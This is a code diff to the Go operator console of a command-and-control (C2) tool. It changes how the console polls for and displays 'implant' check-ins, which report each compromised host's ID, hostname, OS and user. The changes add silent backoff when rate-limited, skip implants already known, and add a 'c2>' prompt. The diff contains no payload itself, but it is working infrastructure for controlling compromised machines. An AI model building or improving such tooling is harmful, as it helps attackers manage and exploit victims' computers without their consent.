@@ -134,13 +134,18 @@ func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
 }
 
 // checkForCheckins polls for new implant check-ins and results.
-func (op *Operator) checkForCheckins() {
+// Returns true if anything was found.
+func (op *Operator) checkForCheckins() bool {
 	results, err := op.PollResults()
 	if err != nil {
-		fmt.Printf("[!] Poll error: %v\n", err)
-		return
+		// Suppress rate limit spam — just backoff silently
+		errStr := strings.ToLower(err.Error())
+		if strings.Contains(errStr, "rate") || strings.Contains(errStr, "429") || strings.Contains(errStr, "too many") {
+			return false
+		}
+		fmt.Printf("\n[!] Poll error: %v\nc2> ", err)
+		return false
 	}
-	// Display any non-checkin results that came in
 	if len(results) > 0 {
 		seqs := make([]int, 0, len(results))
 		for s := range results {
@@ -148,21 +153,35 @@ func (op *Operator) checkForCheckins() {
 		}
 		sort.Ints(seqs)
 		for _, s := range seqs {
+			fmt.Println()
 			displayResult(s, results[s])
+			fmt.Print("c2> ")
 		}
+		return true
 	}
+	return false
 }
 
 // startBackgroundPoller runs a goroutine that continuously polls
-// for new checkins and results, printing them asynchronously.
+// for new checkins and results, with exponential backoff on errors.
 func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
-	interval := 15 * time.Second
+	baseInterval := 20 * time.Second
+	interval := baseInterval
+
 	for {
 		select {
 		case <-stopCh:
 			return
 		case <-time.After(interval):
-			op.checkForCheckins()
+			found := op.checkForCheckins()
+			if found {
+				interval = baseInterval // reset on success
+			} else {
+				// Gradually slow down to avoid rate limits (max 60s)
+				if interval < 60*time.Second {
+					interval = interval + 5*time.Second
+				}
+			}
 		}
 	}
 }
@@ -191,7 +210,6 @@ func (op *Operator) Interactive() {
 
 		line := strings.TrimSpace(scanner.Text())
 		if line == "" {
-			op.checkForCheckins()
 			continue
 		}
 
@@ -305,10 +323,15 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 	data, _ := result["data"].(string)
 	var info map[string]interface{}
 	if err := json.Unmarshal([]byte(data), &info); err != nil {
-		fmt.Println("\n[+] New implant connected! (could not parse details)")
 		return
 	}
 	clientID, _ := info["client_id"].(string)
+
+	// Skip if already known
+	if _, exists := op.connectedClients[clientID]; exists {
+		return
+	}
+
 	hostname, _ := info["hostname"].(string)
 	osInfo, _ := info["os"].(string)
 	user, _ := info["user"].(string)
@@ -317,7 +340,12 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		pid = int(p)
 	}
 	ts, _ := result["ts"].(float64)
-	timestamp := time.Unix(int64(ts), 0).Format("2006-01-02 15:04:05")
+	var timestamp string
+	if ts > 0 {
+		timestamp = time.Unix(int64(ts), 0).Format("2006-01-02 15:04:05")
+	} else {
+		timestamp = time.Now().Format("2006-01-02 15:04:05")
+	}
 
 	op.connectedClients[clientID] = ClientInfo{
 		Hostname:    hostname,
@@ -331,8 +359,9 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		"    client_id : %s\n"+
 		"    hostname  : %s\n"+
 		"    os        : %s\n"+
-		"    timestamp : %s\n\n",
-		clientID, hostname, osInfo, timestamp)
+		"    user      : %s\n"+
+		"    timestamp : %s\n\nc2> ",
+		clientID, hostname, osInfo, user, timestamp)
 }
 
 func displayResult(seq int, result map[string]interface{}) {
